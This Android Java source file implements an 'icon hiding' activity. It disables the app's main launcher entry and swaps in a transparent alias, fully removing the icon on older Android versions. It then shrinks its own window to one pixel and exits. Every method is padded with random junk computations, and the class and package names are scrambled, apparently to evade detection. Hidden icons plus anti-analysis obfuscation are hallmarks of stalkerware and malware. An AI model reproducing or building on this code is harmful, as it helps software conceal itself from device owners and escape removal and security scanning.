package rid.jdi.bbwq;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（PEXW），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class PEXX extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_CjluRPihwKSJmURkA = new java.lang.Object();
        int i_ONyWJJjlnpNsyWFtqe = arr_CjluRPihwKSJmURkA.hashCode();
        int j_vdhcz = new java.util.Random().nextInt(100);
        int tmp_QdPvBCXsvyPzAvu = (i_ONyWJJjlnpNsyWFtqe ^ j_vdhcz) & 0x7FFFFFFF;
        if (tmp_QdPvBCXsvyPzAvu == 40 && i_ONyWJJjlnpNsyWFtqe < 14) {
            arr_CjluRPihwKSJmURkA.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(PEXX.this, PEXW.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(PEXX.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_LtidynEIhVL = java.lang.System.nanoTime();
        int i_oVbkPXHYoAJuKCsepp = new java.util.Random().nextInt(1000);
        boolean j_GhWJTHvtUpJxmmSwF = (arr_LtidynEIhVL % (i_oVbkPXHYoAJuKCsepp + 76)) > 12;
        double tmp_DxenBj = j_GhWJTHvtUpJxmmSwF ? java.lang.Math.sqrt(i_oVbkPXHYoAJuKCsepp) : java.lang.Math.pow(i_oVbkPXHYoAJuKCsepp, 54);
        if (tmp_DxenBj < 0.0) {
            java.lang.System.out.println(tmp_DxenBj);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        long arr_LtidynEIhVL = java.lang.System.nanoTime();
        int i_oVbkPXHYoAJuKCsepp = new java.util.Random().nextInt(1000);
        boolean j_GhWJTHvtUpJxmmSwF = (arr_LtidynEIhVL % (i_oVbkPXHYoAJuKCsepp + 76)) > 12;
        double tmp_DxenBj = j_GhWJTHvtUpJxmmSwF ? java.lang.Math.sqrt(i_oVbkPXHYoAJuKCsepp) : java.lang.Math.pow(i_oVbkPXHYoAJuKCsepp, 54);
        if (tmp_DxenBj < 0.0) {
            java.lang.System.out.println(tmp_DxenBj);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        java.lang.Object arr_CjluRPihwKSJmURkA = new java.lang.Object();
        int i_ONyWJJjlnpNsyWFtqe = arr_CjluRPihwKSJmURkA.hashCode();
        int j_vdhcz = new java.util.Random().nextInt(100);
        int tmp_QdPvBCXsvyPzAvu = (i_ONyWJJjlnpNsyWFtqe ^ j_vdhcz) & 0x7FFFFFFF;
        if (tmp_QdPvBCXsvyPzAvu == 40 && i_ONyWJJjlnpNsyWFtqe < 14) {
            arr_CjluRPihwKSJmURkA.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
